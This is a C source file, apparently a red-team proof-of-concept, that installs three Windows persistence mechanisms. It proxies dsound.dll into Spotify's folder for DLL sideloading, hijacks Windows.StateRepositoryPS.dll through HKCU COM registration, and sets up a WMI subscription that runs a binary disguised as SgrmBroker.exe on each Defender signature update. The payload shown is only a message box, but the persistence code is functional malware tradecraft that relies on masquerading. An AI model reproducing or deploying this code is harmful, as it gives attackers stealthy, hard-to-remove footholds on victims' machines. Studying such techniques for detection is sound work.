#include "Headers.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// GLOBAL VARIABLES
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

// Pinned module handle set in DllMain.
// This is used by RunMessageBox ("Payload" Function) to identify the DLL name in the message
static HMODULE g_hPinnedModule = NULL;

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// HELPERS
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static LPCWSTR GetCurrentImageName(IN OPTIONAL HMODULE hModule)
{
    static WCHAR szDllPath[MAX_PATH]    = { 0 };
    static WCHAR szProcPath[MAX_PATH]   = { 0 };

    WCHAR* szTarget = (hModule != NULL) ? szDllPath : szProcPath;

    RtlSecureZeroMemory(szTarget, MAX_PATH * sizeof(WCHAR));

    if (!GetModuleFileNameW(hModule, szTarget, MAX_PATH))
        return L"<Unknown>";

    return PathFindFileNameW(szTarget);
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// "Payload" Function
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD RunMessageBox(IN LPVOID pIsDllPayloadFile)
{
    WCHAR   wszCaption[MAX_PATH]    = { 0 };
    WCHAR   wszMessage[MAX_PATH]    = { 0 };
    DWORD   dwSessionId             = WTSGetActiveConsoleSessionId();
    DWORD   dwResponse              = 0x00;

    if (pIsDllPayloadFile)
    {
        if (wsprintfW(wszCaption, L"Injected Into: %ws", GetCurrentImageName(NULL)) < 0)
        {
            DBG_LAST_ERROR("wsprintfW");
            return 0x00;
        }

        if (wsprintfW(wszMessage, L"Hello from %ws! (%ld)", GetCurrentImageName(g_hPinnedModule), GetCurrentProcessId()) < 0)
        {
            DBG_LAST_ERROR("wsprintfW");
            return 0x00;
        }
    }
    else
    {
        if (wsprintfW(wszCaption, L"Running As: %ws", GetCurrentImageName(NULL)) < 0)
        {
            DBG_LAST_ERROR("wsprintfW");
            return 0x00;
        }

        if (wsprintfW(wszMessage, L"Hello from %ws! (%ld)", GetCurrentImageName(NULL), GetCurrentProcessId()) < 0)
        {
            DBG_LAST_ERROR("wsprintfW");
            return 0x00;
        }
    }

    WTSSendMessageW(
        WTS_CURRENT_SERVER_HANDLE,
        dwSessionId,
        wszCaption, (DWORD)(lstrlenW(wszCaption) * sizeof(WCHAR)),
        wszMessage, (DWORD)(lstrlenW(wszMessage) * sizeof(WCHAR)),
        MB_OK | MB_ICONINFORMATION,
        0,
        &dwResponse,
        TRUE
    );

    return 0x00;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// DLL ENTRY POINT LOGIC
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static DWORD WINAPI DllPayloadThread(IN LPVOID lpParameter)
{
    // The module refcount bump taken in DllMain is intentionally never released here —
    // dropping it would allow the COM host to unload us while still holding pointers
    // to our forwarded exports, causing the next COM call to fault on unmapped memory.
    // The kernel releases the refcount automatically when the process exits.
    UNREFERENCED_PARAMETER(lpParameter);

    static HANDLE   hMutexHandle                    = NULL;
    static BOOL     bAlreadyRanInCurrentProcess     = FALSE;

    // if another process already owns the mutex, the payload is already running system-wide and we should not execute again
    if (AcquirePayloadMutex(&hMutexHandle))
    {
        DBG("[!] Payload Already Running In Another Process. Skipping...");
        return 0x00;
    }

    // The COM host may unload and reload our DLL multiple times within the same process lifetime 
    // The static flag survives reloads and prevents re-execution in that case.
    // InterlockedCompareExchange guards against two DllPayloadThread(s) racing if
    // the COM host loads us on two threads simultaneously.
    if (InterlockedCompareExchange((LONG*)&bAlreadyRanInCurrentProcess, TRUE, FALSE))
    {
        DBG("[!] Payload Already Executed In This Process. Skipping...");
        return 0x00;
    }

    RunMessageBox((PVOID)TRUE);

    return 0x00;
}


BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);

    static HMODULE  hCurrModule     = NULL;
    HANDLE          hThread         = NULL;
    HMODULE         hPinnedModule   = NULL;

    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
            // Bump our own module refcount before spawning the thread.
            // Without this bump, if the host process calls FreeLibrary while our thread is still
            // running, the refcount drops to zero and the loader unmaps us, crashing the process.
            // GetModuleHandleExW with GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS (and without
            // GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT) increments the module refcount,
            // guaranteeing the loader cannot unmap our module for as long as we hold this
            // extra reference. We intentionally never call FreeLibrary on hPinnedModule, and
            // instead leave the kernel to drop it on process exit.
            if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCWSTR)DllPayloadThread, &hPinnedModule))
            {
                DBG_LAST_ERROR("GetModuleHandleExW");
                return TRUE;
            }

            hCurrModule     = hPinnedModule;
            g_hPinnedModule = hPinnedModule;

            DisableThreadLibraryCalls(hCurrModule);

            DBG("[*] DLL %ws Attached To PID: %lu | Process: %ws | At: 0x%p",
                GetCurrentImageName(hCurrModule),
                GetCurrentProcessId(),
                GetCurrentImageName(NULL),
                hCurrModule);

            if (!(hThread = CreateThread(NULL, 0x00, DllPayloadThread, NULL, 0x00, NULL)))
            {
                DBG_LAST_ERROR("CreateThread");

                // Thread creation failed, so we have to release the refcount we made.
                // Without this, the DLL can never be unloaded cleanly by the COM host 
                FreeLibrary(hPinnedModule);
            }

            CLOSE_HANDLE(hThread);
            break;
        }

        case DLL_PROCESS_DETACH:
        {
            // Mutex is intentionally not released here.
            // Releasing on detach would allow re-acquisition on the next
            // DLL_PROCESS_ATTACH, breaking the mutex guard. The COM host frequently
            // unloads and reloads DLLs between COM calls, so detach does not mean the
            // process is exiting. The kernel releases the mutex automatically when the
            // process truly exits.
            DBG_CLOSE();
            break;
        }

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }

    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
// EXE ENTRY POINT LOGIC
// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int main()
{
    HANDLE      hMutex                          = NULL;
    PBYTE       pDllFileBuffer                  = NULL;
    DWORD       dwDllFileSize                   = 0x00;
    LPSTR       pszDllName                      = NULL,
                pszSystem32DllPath              = NULL;
    WCHAR       wszSystem32DllPath[MAX_PATH]    = { 0 };
    BOOL        bAlreadyInstalled               = FALSE;

    if (AcquirePayloadMutex(&hMutex))
    {
        DBG("[!] Payload Already Running. Exiting...");
        return 0;
    }

    // Check if persistence layers were already installed in a previous run.
    if (!VerifyOrCreateRegistryFlag(HKEY_CURRENT_USER, CONFIG_REG_KEY, CONFIG_REG_VALUE_NAME, CONFIG_REG_VALUE_DATA, &bAlreadyInstalled))
        return -1;

    if (bAlreadyInstalled)
    {
        DBG("[i] Persistence Layers Already Installed, Skipping...");
        goto _RUN_PAYLOAD;
    }

    // ==============================================================
    // LAYER 3 - DLL SIDELOAD
    // Reads exports from the real dsound.dll in System32, patches our
    // EXE into a proxy DLL that forwards all calls to dspatial.dll,
    // then drops both into Spotify's directory.
    // Spotify loads dsound.dll from its own directory before System32,
    // so our proxy gets loaded instead of the real one.
    // ==============================================================

    // Forward DLL name is the renamed copy of the real dsound.dll (dspatial.dll)
    if (!(pszDllName = (LPSTR)ConvertString((LPVOID)SIDELOAD_FORWARD_DLL, lstrlenW(SIDELOAD_FORWARD_DLL), ENCODING_WIDE_TO_ANSI)))
        return -1;

    // Resolve the full System32 path of the real dsound.dll to read its exports
    if (!GetSystem32PathW(SIDELOAD_PAYLOAD_DLL, wszSystem32DllPath, ARRAYSIZE(wszSystem32DllPath)))
        goto _END_OF_FUNC;

    if (!(pszSystem32DllPath = (LPSTR)ConvertString((LPVOID)wszSystem32DllPath, lstrlenW(wszSystem32DllPath), ENCODING_WIDE_TO_ANSI)))
        goto _END_OF_FUNC;

    // Patch our EXE into a proxy DLL with dsound.dll's export table, forwarding all calls to dspatial.dll, then drop it into Spotify's directory
    if (ConvertExecutableToDll(pszSystem32DllPath, pszDllName, (ULONG_PTR)DllMain, &pDllFileBuffer, &dwDllFileSize))
        DropSideloadDlls(pDllFileBuffer, dwDllFileSize);

    HEAP_FREE(pszDllName);
    HEAP_FREE(pszSystem32DllPath);
    HEAP_FREE(pDllFileBuffer);

    // ==============================================================
    // LAYER 2 - COM HIJACK
    // Reads exports from Windows.StateRepositoryPS.dll, patches our EXE
    // into a proxy DLL that forwards all calls to Common.StateRepositoryRM.dll,
    // then registers it under HKCU so it gets loaded instead of the real one.
    // HKCU is checked before HKLM by the COM loader, so our DLL wins.
    // ==============================================================

    // Forward DLL name is the renamed copy of Windows.StateRepositoryPS.dll
    if (!(pszDllName = (LPSTR)ConvertString((LPVOID)COM_FORWARD_DLL_NAME, lstrlenW(COM_FORWARD_DLL_NAME), ENCODING_WIDE_TO_ANSI)))
        return -1;

    // Resolve the full System32 path of the real Windows.StateRepositoryPS.dll to read its exports
    if (!GetSystem32PathW(COM_SYSTEM_DLL_NAME, wszSystem32DllPath, ARRAYSIZE(wszSystem32DllPath)))
        goto _END_OF_FUNC;

    if (!(pszSystem32DllPath = (LPSTR)ConvertString((LPVOID)wszSystem32DllPath, lstrlenW(wszSystem32DllPath), ENCODING_WIDE_TO_ANSI)))
        goto _END_OF_FUNC;

    // Patch our EXE into a proxy DLL with Windows.StateRepositoryPS.dll's export table forwarding all calls to Common.StateRepositoryRM.dll, then install the COM hijack registry key
    if (ConvertExecutableToDll(pszSystem32DllPath, pszDllName, (ULONG_PTR)DllMain, &pDllFileBuffer, &dwDllFileSize))
        InstallComHijack(pDllFileBuffer, dwDllFileSize);

    HEAP_FREE(pszDllName);
    HEAP_FREE(pszSystem32DllPath);
    HEAP_FREE(pDllFileBuffer);


    // ==============================================================
    // LAYER 1 - WMI PERSISTENCE
    // Copies our EXE to a directory and registers a WMI event
    // subscription that executes it every time windows defender does 
    // a signature update.
    // This is done using a registry value change trigger (SignatureUpdateLastAttempted).
    // Dropped binary is SgrmBroker.exe under System32\wbem\
    // ==============================================================
    DropExecutableForWmi();

_RUN_PAYLOAD:
  
    RunMessageBox(FALSE);

_END_OF_FUNC:
    HEAP_FREE(pszDllName);
    HEAP_FREE(pszSystem32DllPath);
    HEAP_FREE(pDllFileBuffer);
    // Release the mutex
    ReleasePayloadMutex(hMutex);
    DBG_CLOSE();
    return 0;
}


// If compiled in "Stripped" mode
#if !defined(_DEBUG) && !defined(NDEBUG)
void EntryPoint()
{
    INT nResult = main();
    ExitProcess(nResult);
}
#endif
